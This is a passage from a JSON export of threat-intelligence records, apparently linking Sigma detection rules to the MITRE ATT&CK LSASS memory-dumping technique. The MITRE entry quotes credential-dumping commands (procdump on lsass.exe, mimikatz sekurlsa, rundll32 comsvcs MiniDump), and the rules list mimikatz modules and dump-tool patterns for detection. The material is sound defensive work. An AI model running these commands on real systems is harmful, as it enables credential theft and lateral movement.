                        "uuid": "5afee48e-67dd-4e03-a783-f74259dcf998",
                        "lookup_data": {
                            "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/10/30\ndescription: Detects suspicious uses of the SysInternals Procdump utility by using\n  a special command line parameter in combination with the lsass.exe process. This\n  way we're also able to catch cases in which the attacker has renamed the procdump\n  executable.\ndetection:\n  condition: all of selection*\n  selection1:\n    CommandLine|contains:\n    - ' -ma '\n    - ' /ma '\n  selection2:\n    CommandLine|contains: ' ls'\nfalsepositives:\n- Unlikely, because no one should dump an lsass process memory\n- Another tool that uses the command line switches of Procdump\nid: 5afee48e-67dd-4e03-a783-f74259dcf998\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/08/12\nreferences:\n- Internal Research\nstatus: stable\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.credential_access\n- attack.t1003.001\n- car.2013-05-009\ntitle: Suspicious Use of Procdump on LSASS\n",
                            "sigma:id": "5afee48e-67dd-4e03-a783-f74259dcf998",
                            "title": "Suspicious Use of Procdump on LSASS",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "65f2d882-3f41-4d48-8a06-29af77ec9f90",
                        "lookup_data": {
                            "mitre-attack-id": "T1003.001",
                            "mitre-cti:description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
                            "mitre-cti:name": "LSASS Memory",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'modified': '2022-10-06T16:16:53.388Z', 'name': 'LSASS Memory', 'description': \"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\\n\\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\\n\\nFor example, on the target host use procdump:\\n\\n* <code>procdump -ma lsass.exe lsass_dump</code>\\n\\nLocally, mimikatz can be run using:\\n\\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\\n* <code>sekurlsa::logonPasswords</code>\\n\\nBuilt-in Windows tools such as comsvcs.dll can also be used:\\n\\n* <code>rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\\n\\n\\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages</code> and <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\\n\\nThe following SSPs can be used to access credentials:\\n\\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\\n\", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': \"Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.\\n\\nOn Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.\\n\\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\", 'x_mitre_platforms': ['Windows'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.1', 'x_mitre_contributors': ['Edward Millington', 'Ed Williams, Trustwave, SpiderLabs'], 'x_mitre_data_sources': ['Process: Process Access', 'Process: Process Creation', 'Process: OS API Execution', 'Command: Command Execution'], 'type': 'attack-pattern', 'id': 'attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90', 'created': '2020-02-11T18:41:44.783Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1003/001', 'external_id': 'T1003.001'}, {'source_name': 'Medium Detecting Attempts to Steal Passwords from Memory', 'description': 'French, D. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019.', 'url': 'https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea'}, {'source_name': 'Graeber 2014', 'description': 'Graeber, M. (2014, October). Analysis of Malicious Security Support Provider DLLs. Retrieved March 1, 2017.', 'url': 'http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html'}, {'source_name': 'Volexity Exchange Marauder March 2021', 'description': 'Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021.', 'url': 'https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/'}, {'source_name': 'Powersploit', 'description': 'PowerSploit. (n.d.). Retrieved December 4, 2014.', 'url': 'https://github.com/mattifestation/PowerSploit'}, {'source_name': 'Symantec Attacks Against Government Sector', 'description': 'Symantec. (2021, June 10). Attacks Against the Government Sector. Retrieved September 28, 2021.', 'url': 'https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf'}, {'source_name': 'TechNet Blogs Credential Protection', 'description': 'Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018.', 'url': 'https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98",
                        "lookup_data": {
                            "description": "Detects Access to LSASS Process",
                            "raw": "author: Markus Neis\ndate: 2018/08/26\ndescription: Detects Access to LSASS Process\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_begins:\n    ProcessName|startswith:\n    - C:\\Windows\\System32\\DriverStore\\\n    - C:\\WINDOWS\\Installer\\\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n  filter_exact:\n    ProcessName:\n    - C:\\Windows\\System32\\atiesrxx.exe\n    - C:\\Windows\\System32\\CompatTelRunner.exe\n    - C:\\Windows\\System32\\msiexec.exe\n    - C:\\Windows\\System32\\nvwmi64.exe\n    - C:\\Windows\\System32\\svchost.exe\n    - C:\\Windows\\System32\\Taskmgr.exe\n    - C:\\Windows\\System32\\wbem\\WmiPrvSE.exe\n    - C:\\Windows\\SysWOW64\\msiexec.exe\n  filter_thor:\n    ProcessName|endswith:\n    - \\thor64.exe\n    - \\thor.exe\n    ProcessName|startswith: C:\\Windows\\Temp\\asgard2-agent\\\n  selection:\n    EventID: 1121\n    Path|endswith: \\lsass.exe\nfalsepositives:\n- Google Chrome GoogleUpdate.exe\n- Some Taskmgr.exe related activity\nid: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98\nlevel: high\nlogsource:\n  definition: 'Requirements:Enabled Block credential stealing from the Windows local\n    security authority subsystem (lsass.exe) from Attack Surface Reduction (GUID:\n    9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)'\n  product: windows\n  service: windefend\nmodified: 2022/08/13\nreferences:\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-exploit-guard/attack-surface-reduction-exploit-guard?WT.mc_id=twitter\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Access Detected via Attack Surface Reduction\n",
                            "sigma:id": "a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98",
                            "title": "LSASS Access Detected via Attack Surface Reduction",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
                        "lookup_data": {
                            "description": "This method detects mimikatz keywords in different Eventlogs (some of them only appear in older Mimikatz version that are however still used by different threat groups)",
                            "raw": "author: Florian Roth (Nextron Systems), David ANDRE (additional keywords)\ndate: 2017/01/10\ndescription: This method detects mimikatz keywords in different Eventlogs (some of\n  them only appear in older Mimikatz version that are however still used by different\n  threat groups)\ndetection:\n  condition: keywords and not filter\n  filter:\n    EventID: 15\n  keywords:\n  - dpapi::masterkey\n  - eo.oe.kiwi\n  - event::clear\n  - event::drop\n  - gentilkiwi.com\n  - kerberos::golden\n  - kerberos::ptc\n  - kerberos::ptt\n  - kerberos::tgt\n  - Kiwi Legit Printer\n  - 'lsadump::'\n  - mimidrv.sys\n  - \\mimilib.dll\n  - misc::printnightmare\n  - misc::shadowcopies\n  - misc::skeleton\n  - privilege::backup\n  - privilege::debug\n  - privilege::driver\n  - 'sekurlsa::'\nfalsepositives:\n- Naughty administrators\n- AV Signature updates\n- Files with Mimikatz in their filename\nid: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8\nlevel: high\nlogsource:\n  product: windows\nmodified: 2022/01/05\nreferences:\n- https://tools.thehacker.recipes/mimikatz/modules\nstatus: test\ntags:\n- attack.s0002\n- attack.lateral_movement\n- attack.credential_access\n- car.2013-07-001\n- car.2019-04-004\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.001\n- attack.t1003.006\ntitle: Mimikatz Use\n",
                            "sigma:id": "06d71506-7beb-4f22-8888-e2e5e2ca7fd8",
                            "title": "Mimikatz Use",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "55e29995-75e7-451a-bef0-6225e2f13597",
                        "lookup_data": {
                            "description": "Detects changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/02/26\ndescription: Detects changes to the Registry in which a monitor program gets registered\n  to dump the memory of the lsass.exe process\ndetection:\n  condition: selection\n  selection:\n    TargetObject|contains: Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\nfalsepositives:\n- Unlikely\nid: 55e29995-75e7-451a-bef0-6225e2f13597\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/12/19\nreferences:\n- https://www.deepinstinct.com/2021/02/16/lsass-memory-dumps-are-stealthier-than-ever-before-part-2/\n- https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\nrelated:\n- id: 36803969-5421-41ec-b92f-8500f79c23b0\n  type: similar\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Potential Credential Dumping Via LSASS SilentProcessExit Technique\n",
                            "sigma:id": "55e29995-75e7-451a-bef0-6225e2f13597",
                            "title": "Potential Credential Dumping Via LSASS SilentProcessExit Technique",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4b9a8556-99c4-470b-a40c-9c8d02c77ed0",
                        "lookup_data": {
                            "description": "Detects LSASS process access by LaZagne for credential dumping.",
                            "raw": "author: Bhabesh Raj, Jonhnathan Ribeiro\ndate: 2020/09/09\ndescription: Detects LSASS process access by LaZagne for credential dumping.\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains|all:\n    - C:\\Windows\\SYSTEM32\\ntdll.dll+\n    - '|C:\\Windows\\System32\\KERNELBASE.dll+'\n    - _ctypes.pyd+\n    - python27.dll+\n    GrantedAccess: '0x1FFFFF'\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: 4b9a8556-99c4-470b-a40c-9c8d02c77ed0\nlevel: critical\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/08/13\nreferences:\n- https://twitter.com/bh4b3sh/status/1303674603819081728\nstatus: stable\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0349\ntitle: Credential Dumping by LaZagne\n",
                            "sigma:id": "4b9a8556-99c4-470b-a40c-9c8d02c77ed0",
                            "title": "Credential Dumping by LaZagne",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "472159c5-31b9-4f56-b794-b766faa8b0a7",
                        "lookup_data": {
                            "description": "Detects suspicious access to Lsass handle via a call trace to \"seclogon.dll\"",
                            "raw": "author: Samir Bousseaden (original elastic rule), Nasreddine Bencherchali (sigma)\ndate: 2022/06/29\ndescription: Detects suspicious access to Lsass handle via a call trace to \"seclogon.dll\"\ndetection:\n  condition: selection\n  selection:\n    CallTrace|contains: seclogon.dll\n    GrantedAccess: '0x14c0'\n    SourceImage|endswith: \\svchost.exe\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Unknown\nid: 472159c5-31b9-4f56-b794-b766faa8b0a7\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nreferences:\n- https://twitter.com/SBousseaden/status/1541920424635912196\n- https://github.com/elastic/detection-rules/blob/2bc1795f3d7bcc3946452eb4f07ae799a756d94e/rules/windows/credential_access_lsass_handle_via_malseclogon.toml\n- https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: Suspicious LSASS Access Via MalSecLogon\n",
                            "sigma:id": "472159c5-31b9-4f56-b794-b766faa8b0a7",
                            "title": "Suspicious LSASS Access Via MalSecLogon",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
                        "lookup_data": {
                            "description": "Detects well-known credential dumping tools execution via service execution events",
                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - System\n",
                            "sigma:id": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
                            "title": "Credential Dumping Tools Service Execution - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
                        "lookup_data": {
                            "description": "Detects well-known credential dumping tools execution via specific named pipes",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Detects well-known credential dumping tools execution via specific named\n  pipes\ndetection:\n  condition: selection\n  selection:\n    PipeName|contains:\n    - \\lsadump\n    - \\cachedump\n    - \\wceservicepipe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump-Tools Named Pipes\n",
                            "sigma:id": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
                            "title": "Cred Dump-Tools Named Pipes",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fa34b441-961a-42fa-a100-ecc28c886725",
                        "lookup_data": {
                            "description": "Detects process access to LSASS memory with suspicious access flags and from a suspicious folder",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/11/27\ndescription: Detects process access to LSASS memory with suspicious access flags and\n  from a suspicious folder\ndetection:\n  condition: selection and not 1 of filter*\n  filter1:\n    GrantedAccess: '0x410'\n    SourceImage|contains: \\AppData\\Local\\\n    SourceImage|endswith:\n    - \\Microsoft VS Code\\Code.exe\n    - \\software_reporter_tool.exe\n    - \\DropboxUpdate.exe\n    - \\MBAMInstallerService.exe\n    - \\WebexMTA.exe\n    - \\WebEx\\WebexHost.exe\n    - \\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe\n    SourceImage|startswith: C:\\Users\\\n  filter_chrome:\n    GrantedAccess: '0x410'\n    SourceImage|endswith: .tmp\\GoogleUpdate.exe\n    SourceImage|startswith: C:\\Program Files (x86)\\Google\\Temp\\\n  filter_dropbox1:\n    GrantedAccess:\n    - '0x410'\n    - '0x1410'\n    SourceImage|endswith: .tmp\\DropboxUpdate.exe\n    SourceImage|startswith: C:\\Windows\\Temp\\\n  filter_dropbox2:\n    GrantedAccess: '0x1410'\n    SourceImage|contains: \\AppData\\Local\\Temp\\\n    SourceImage|endswith: .tmp\\DropboxUpdate.exe\n    SourceImage|startswith: C:\\Users\\\n  filter_keybase:\n    GrantedAccess: '0x1fffff'\n    SourceImage|endswith: \\AppData\\Local\\Keybase\\keybase.exe\n    SourceImage|startswith: C:\\Users\\\n  filter_ms_products:\n    GrantedAccess: '0x1410'\n    SourceImage|contains|all:\n    - \\AppData\\Local\\Temp\\\n    - \\vs_bootstrapper_\n    SourceImage|startswith: C:\\Users\\\n  filter_nextron:\n    GrantedAccess:\n    - '0x1fffff'\n    - '0x1010'\n    - '0x101010'\n    SourceImage|endswith:\n    - \\thor64.exe\n    - \\thor.exe\n    - \\aurora-agent-64.exe\n    - \\aurora-agent.exe\n    SourceImage|startswith:\n    - C:\\Windows\\Temp\\asgard2-agent\\\n    - C:\\Windows\\Temp\\asgard2-agent-sc\\\n  filter_updates_temp:\n    SourceImage|startswith:\n    - C:\\Program Files (x86)\\\n    - C:\\Program Files\\\n  selection:\n    GrantedAccess|endswith:\n    - '10'\n    - '30'\n    - '50'\n    - '70'\n    - '90'\n    - B0\n    - D0\n    - F0\n    - '18'\n    - '38'\n    - '58'\n    - '78'\n    - '98'\n    - B8\n    - D8\n    - F8\n    - 1A\n    - 3A\n    - 5A\n    - 7A\n    - 9A\n    - BA\n    - DA\n    - FA\n    - '0x14C2'\n    - FF\n    SourceImage|contains:\n    - \\Temp\\\n    - \\Users\\Public\\\n    - \\PerfLogs\\\n    - \\AppData\\\n    - \\Temporary\n    TargetImage|endswith: \\lsass.exe\nfalsepositives:\n- Legitimate software accessing LSASS process for legitimate reason\nfields:\n- User\n- SourceImage\n- GrantedAccess\nid: fa34b441-961a-42fa-a100-ecc28c886725\nlevel: high\nlogsource:\n  category: process_access\n  product: windows\nmodified: 2022/11/01\nreferences:\n- https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights\n- https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&ithint=file%2cpptx&app=PowerPoint&authkey=!AMvCRTKB_V1J5ow\n- https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.s0002\ntitle: LSASS Access from Program in Suspicious Folder\n",
                            "sigma:id": "fa34b441-961a-42fa-a100-ecc28c886725",
                            "title": "LSASS Access from Program in Suspicious Folder",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6355a919-2e97-4285-a673-74645566340d",
                        "lookup_data": {
                            "description": "Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/01/04\ndescription: Detects uses of the rdrleakdiag.exe LOLOBIN utility to dump process memory\ndetection:\n  condition: selection1 or selection2\n  selection1:\n    CommandLine|contains: /fullmemdmp\n    Image|endswith: \\rdrleakdiag.exe\n  selection2:\n    CommandLine|contains|all:\n    - /fullmemdmp\n    - ' /o '\n    - ' /p '\nfalsepositives:\n- Unknown\nid: 6355a919-2e97-4285-a673-74645566340d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/05/10\nreferences:\n- https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1036\n- attack.t1003.001\ntitle: RdrLeakDiag Process Dump\n",
                            "sigma:id": "6355a919-2e97-4285-a673-74645566340d",
                            "title": "RdrLeakDiag Process Dump",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e3d3601-0662-4af0-b1d2-36a05e90c40a",
                        "lookup_data": {
                            "description": "LSASS memory dump creation using operating systems utilities. Procdump will use process name in output file if no name is specified",
                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/10/22\ndescription: LSASS memory dump creation using operating systems utilities. Procdump\n  will use process name in output file if no name is specified\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|contains: lsass\n    TargetFilename|endswith: dmp\nfalsepositives:\n- Dumping lsass memory for forensic investigation purposes by legitimate incident\n  responder or forensic invetigator\n- Dumps of another process that contains lsass in its process name (substring)\nfields:\n- ComputerName\n- TargetFilename\nid: 5e3d3601-0662-4af0-b1d2-36a05e90c40a\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: LSASS Memory Dump File Creation\n",
                            "sigma:id": "5e3d3601-0662-4af0-b1d2-36a05e90c40a",
                            "title": "LSASS Memory Dump File Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "646ea171-dded-4578-8a4d-65e9822892e3",
                        "lookup_data": {
                            "description": "Detects process memory dump via comsvcs.dll and rundll32 using different techniques (ordinal, minidump function...etc)",
                            "raw": "author: Florian Roth (Nextron Systems), Modexp, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020/02/18\ndescription: Detects process memory dump via comsvcs.dll and rundll32 using different\n  techniques (ordinal, minidump function...etc)\ndetection:\n  condition: all of selection* or unique_selection\n  selection_cli:\n    CommandLine|contains:\n    - '24 '\n    - '#24'\n    - '#+24'\n    - MiniDump\n    CommandLine|contains|all:\n    - comsvcs\n    - full\n  selection_img:\n  - Image|endswith: \\rundll32.exe\n  - OriginalFileName: RUNDLL32.EXE\n  - CommandLine|contains: rundll32\n  unique_selection:\n    CommandLine|contains: '#-4294967272'\nfalsepositives:\n- Unlikely, because no one should dump the process memory in that way\nid: 646ea171-dded-4578-8a4d-65e9822892e3\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/21\nreferences:\n- https://twitter.com/shantanukhande/status/1229348874298388484\n- https://twitter.com/pythonresponder/status/1385064506049630211?s=21\n- https://twitter.com/Hexacorn/status/1224848930795552769\n- https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n- https://twitter.com/SBousseaden/status/1167417096374050817\n- https://twitter.com/Wietze/status/1542107456507203586\nrelated:\n- id: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\n  type: obsoletes\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.credential_access\n- attack.t1036\n- attack.t1003.001\n- car.2013-05-009\ntitle: Process Dump via Rundll32 and Comsvcs.dll\n",
                            "sigma:id": "646ea171-dded-4578-8a4d-65e9822892e3",
                            "title": "Process Dump via Rundll32 and Comsvcs.dll",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f26307d8-14cd-47e3-a26b-4b4769f24af6",
                        "lookup_data": {
                            "description": "Detects suspicious process patterns found in logs when CrackMapExec is used",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/03/12\ndescription: Detects suspicious process patterns found in logs when CrackMapExec is\n  used\ndetection:\n  condition: 1 of selection*\n  selection_lsass_dump1:\n    CommandLine|contains:\n    - 'cmd.exe /c '\n    - 'cmd.exe /r '\n    - 'cmd.exe /k '\n    - 'cmd /c '\n    - 'cmd /r '\n    - 'cmd /k '\n    CommandLine|contains|all:\n    - 'tasklist /fi '\n    - Imagename eq lsass.exe\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  selection_lsass_dump2:\n    CommandLine|contains|all:\n    - do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump\n    - \\Windows\\Temp\\\n    - ' full'\n    - '%%B'\n  selection_procdump:\n    CommandLine|contains|all:\n    - tasklist /v /fo csv\n    - findstr /i \"lsass\"\nfalsepositives:\n- Unknown\nid: f26307d8-14cd-47e3-a26b-4b4769f24af6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/18\nreferences:\n- https://mpgn.gitbook.io/crackmapexec/smb-protocol/obtaining-credentials/dump-lsass\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.001\ntitle: CrackMapExec Process Patterns\n",
                            "sigma:id": "f26307d8-14cd-47e3-a26b-4b4769f24af6",
                            "title": "CrackMapExec Process Patterns",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e5b33f7d-eb93-48b6-9851-09e1e610b6d7",
                        "lookup_data": {
                            "description": "Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.",
